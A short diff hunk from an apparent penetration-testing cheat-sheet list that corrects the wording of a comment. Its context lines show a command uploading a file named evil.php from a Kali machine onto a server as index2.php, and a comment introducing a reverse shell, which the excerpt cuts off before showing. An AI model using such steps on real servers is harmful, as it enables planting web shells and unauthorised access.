@@ -540,7 +540,7 @@ service-names = [
         "\t#Enter",
         "",
         "",
-        "#The Following Can Be Used to Put Malicious A File Onto Server:",
+        "#The Following Can Be Used to Put A Malicious File Onto Server:",
         "put /home/kali/machines/lucky/evil.php% index2.php",
         "\n",
         '# The following Can Be Used to Get a Reverse Shell:',
